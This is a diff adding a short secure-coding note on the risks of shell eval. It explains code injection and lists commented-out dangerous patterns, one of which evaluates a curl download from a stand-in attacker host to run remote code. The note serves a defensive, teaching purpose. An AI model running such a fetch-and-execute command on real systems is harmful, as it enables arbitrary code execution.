@@ -1,0 +1,17 @@
+# eval risks: when it becomes dangerous
+
+eval is dangerous when its argument contains untrusted data. Examples of dangerous patterns (DO NOT USE):
+
+    # User-supplied input going into eval — NEVER do this:
+    # read -p "Enter expression: " user_input
+    # eval "$user_input"   # arbitrary code execution
+
+    # Environment variable from untrusted source:
+    # eval "$UNTRUSTED_VAR"
+
+    # Substituting web content into eval — NEVER:
+    # eval "$(curl https://attacker.example.com/payload)"
+
+The danger is code injection: if the string contains shell metacharacters (;, &&, |, $(), backticks), eval will execute them.
+
+Safe usage: only pass output from trusted local commands installed by you or your system package manager.
